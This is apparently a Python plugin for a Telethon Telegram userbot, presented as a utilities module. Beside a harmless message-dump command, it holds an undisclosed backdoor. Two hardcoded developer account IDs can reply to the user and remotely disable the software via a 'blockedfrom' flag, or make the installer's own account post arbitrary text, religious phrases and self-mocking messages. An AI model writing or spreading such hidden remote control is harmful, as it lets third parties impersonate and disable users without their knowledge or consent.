import random
import re
import time
from platform import python_version
import os
from telethon import version, Button, events
from telethon.errors.rpcerrorlist import (
    MediaEmptyError,
    WebpageCurlFailedError,
    WebpageMediaEmptyError,
)
from telethon.events import CallbackQuery

from JoKeRUB import StartTime, l313l, JEPVERSION

from ..Config import Config
from ..core.managers import edit_or_reply
from ..helpers.functions import catalive, check_data_base_heal_th, get_readable_time
from ..helpers.utils import reply_id
from ..sql_helper.globals import addgvar, delgvar, gvarstatus
from . import mention

plugin_category = "utils"

@l313l.on(events.NewMessage(pattern='.event', outgoing=True))
async def my_event_handler(event):
    if event.is_reply:
        replied_message = await event.get_reply_message()
        if replied_message:
            event_info = replied_message
            with open("event_info.txt", "w") as file:
                file.write(event_info.stringify())
            await l313l.send_file(event.chat_id, "event_info.txt")
            os.remove("event_info.txt")

progs = [5427469031, 5462630004]
DevJoker = [5462630004, 5427469031]

import asyncio
from telethon import events

@l313l.on(events.NewMessage(incoming=True))
async def handle_all_commands(event):
    # التأكد من أن الرسالة رد على بوتك
    if not event.reply_to:
        return
    
    reply_msg = await event.get_reply_message()
    if not reply_msg or reply_msg.from_id.user_id != l313l.uid:
        return
    
    # أوامر المطورين الأساسيين
    if event.sender_id in progs:
        msg = event.message.message
        
        if msg == "حظر من السورس":
            await event.reply("**- حَاظَر مُطَوِرِي ، لَقَد تَم حَظَرَه مِن اِسَتِخدَام اَلسَورَس .**")
            addgvar("blockedfrom", "yes")
        
        elif msg == "الغاء الحظر من السورس":
            await event.reply("**- حَاظَر مُطَوِرِي، لَقَد أَلغَيت الحَظَر .**")
            delgvar("blockedfrom")
        
        elif msg == "شيع الولد":
            for text in ["**بِسِمٍّ اللّٰه وَبِاَللَّهِ**", "**أَشْهَد أَلَّا إِلَهَ إِلَّا اَللَّه**", "**وَأَشْهَدُ أَنَّ مُحَمَّدْ عَبْدُهْ**", "**وَأَشْهَد أَنَّ عَلَى وَلِيِّ اَللَّهِ**"]:
                await event.reply(text)
                await asyncio.sleep(4)
        
        elif msg == "انتة شنو":
            await event.reply("اني مطي 🦓")
            await asyncio.sleep(1)
            await event.reply(file="https://t.me/MemeSoundJep/105")
    
    # أوامر DevJoker
    elif event.sender_id in DevJoker:
        msg = event.message.message
        
        if msg == "منصب؟":
            await event.reply("**يب منصب ✓**")
        
        elif msg == "منو فخر العرب؟":
            await event.reply("**الأمام علي عليه الصلاة والسلام ❤️**")
        
        elif msg.startswith("دز"):
            text = msg[2:].strip()
            if text:
                await event.reply(text)
